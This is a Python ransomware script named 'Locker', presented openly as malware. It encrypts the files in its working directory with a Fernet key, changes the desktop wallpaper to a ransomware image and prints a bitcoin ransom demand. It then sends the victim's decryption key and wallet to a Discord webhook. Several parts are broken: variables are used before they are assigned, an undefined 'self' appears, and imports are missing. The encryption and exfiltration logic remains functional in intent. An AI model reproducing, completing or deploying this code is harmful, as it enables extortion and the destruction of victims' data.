import requests
import os
import time as t
import sys
from colorama import Fore
from cryptography.fernet import Fernet
import webbrowser
import threading


files = []

def what_is_bitcoin():
  url = 'https://bitcoin.org'
  # Open browser to the https://bitcoin.org so they know what bitcoin is
  webbrowser.open(url)

def send_all_info():
  discord_webhook_url = 'your webhook url'
  Message = {
    "content": "OI Boys We Got A Hit!!!! Sending The Stuff Now !"}
  Message2 = {
    "content": f"{key}: This Is Their Decryption Key EHEHE"}
  Message3 = {
    "content": f"{btc_payment}: This Is Their Btc Wallet !!!!"}
  requests.post(discord_webhook_url, data=Message)
  t.sleep(2)
  requests.post(discord_webhook_url, data=Message2)
  btc_payment = input("Please enter btc wallet to unlock.: ")
  requests.post(discord_webhook_url, data=Message3)


def change_desktop_background(self):
        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        # Go to specif url and download+save image using absolute path
        path = f'{self.sysRoot}Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

def encrypt_files():
	files = []
	for file in os.listdir(''):
		if file == "ransomware.py" or file == "unlock.key" or file == "decryptor.py" or file == "main.py":
			continue
		if os.path.isfile(file):
			files.append(file)

	key = Fernet.generate_key()

	for file in files:
		with open(file, "rb") as files:
			contents = files.read()
		contents_encrypted = Fernet(key).encrypt(contents)
		with open(file, "wb") as files:
			files.write(contents_encrypted)


print("""
 /$$                           /$$                                                        
| $$                          | $$                                                        
| $$        /$$$$$$   /$$$$$$$| $$   /$$  /$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$ 
| $$       /$$__  $$ /$$_____/| $$  /$$/ /$$__  $$ /$$__  $$ /$$__  $$|  $$ /$$/ /$$__  $$
| $$      | $$  \ $$| $$      | $$$$$$/ | $$$$$$$$| $$  \__/| $$$$$$$$ \  $$$$/ | $$$$$$$$
| $$      | $$  | $$| $$      | $$_  $$ | $$_____/| $$      | $$_____/  >$$  $$ | $$_____/
| $$$$$$$$|  $$$$$$/|  $$$$$$$| $$ \  $$|  $$$$$$$| $$ /$$  |  $$$$$$$ /$$/\  $$|  $$$$$$$
|________/ \______/  \_______/|__/  \__/ \_______/|__/|__/   \_______/|__/  \__/ \_______/""")
print("\nYou have been infected by Locker !")
print(f"\nPlease pay a fee to unlock your files [{Fore.RED}0.000041BTC{Fore.RESET}]")
print(f"\nOrbital On Top ")
what_is_bitcoin()
change_desktop_background(self)
send_all_info()
t1 = threading.Thread(target=encrypt_files)
t1.start()
